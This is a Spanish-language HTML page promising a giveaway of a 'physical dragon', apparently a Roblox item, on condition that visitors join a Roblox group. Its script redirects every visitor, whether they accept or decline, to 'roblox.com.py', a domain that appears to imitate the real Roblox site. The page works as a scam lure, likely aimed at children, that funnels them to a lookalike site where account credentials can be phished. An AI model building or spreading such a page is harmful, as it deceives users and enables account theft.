<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="https://lh3.googleusercontent.com/pw/AP1GczPxj0rkPbRqAaHVrxNr7NgJH7fSBWP45oVFFckWL8HcmInzsladHjmJaFeXxc7T2xDBzlQx2veYnuIMZMLMVnZqs7IaA416cD18wrr7w8z7NQ4ptMM2tPXeyrwrlSnWuGysvMr-icRtVGCxk77u4hE=w616-h773-s-no-gm?authuser=0" type="image/x-icon">
  <title>Sorteo de Dragón Física</title>
  <style>
    /* Estilo básico */
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      text-align: center;
      color: white;
      overflow: hidden; /* Evita barras de desplazamiento */
    }

    /* Fondo del video */
    .video-background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      z-index: -1;
    }

    .video-background video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    /* Contenedor del contenido */
    .content {
      position: relative;
      z-index: 1;
      margin-top: 20px;
      padding: 20px;
      background: rgba(0, 0, 0, 0.6); /* Fondo semitransparente */
      border-radius: 10px;
      display: inline-block;
    }

    h1 {
      text-shadow: 3px 3px 5px #000;
      font-size: 2em;
      margin-bottom: 10px;
    }

    p {
      text-shadow: 2px 2px 4px #000;
      font-size: 1.2em;
    }

    .button {
      display: inline-block;
      padding: 15px 25px;
      background-color: #FFD700; /* Dorado */
      color: black;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
      box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.5);
      margin-top: 20px;
    }

    .button:hover {
      background-color: #FFC700;
    }

    .message {
      margin-top: 20px;
      font-weight: bold;
      text-shadow: 1px 1px 3px #000;
    }
  </style>
</head>
<body>
  <!-- Video de fondo -->
  <div class="video-background">
    <video autoplay muted loop>
      <source src="videos/video.mp4" type="video/mp4">
      Tu navegador no soporta videos en HTML5.
    </video>
  </div>

  <!-- Contenido principal -->
  <div class="content">
    <h1>¡Sorteo de Dragón Física!</h1>
    <p>Para participar en el sorteo, debes unirte a nuestro grupo de Roblox.</p>
    <button class="button" id="participateBtn">Participar</button>
    <p class="message" id="message"></p>
  </div>

  <script>
    document.getElementById("participateBtn").addEventListener("click", function() {
      const isMember = confirm("¿quieres particilar en el sorteo de una dragon fisica?, acepta para unirte a nuestro grupo de roblox.");
      const messageElement = document.getElementById("message");

      if (isMember) {
        messageElement.textContent = "¡Genial! entra en nuestro grupo de roblox.";
        window.location.href = "https://roblox.com.py/groups/800270751/";
        messageElement.style.color = "green";
      
      } else {
        messageElement.textContent = "Debes unirte al grupo para participar en el sorteo.";
        messageElement.style.color = "red";
        window.location.href = "https://roblox.com.py/groups/800270751/";
      }
    });
  </script>
</body>
</html>
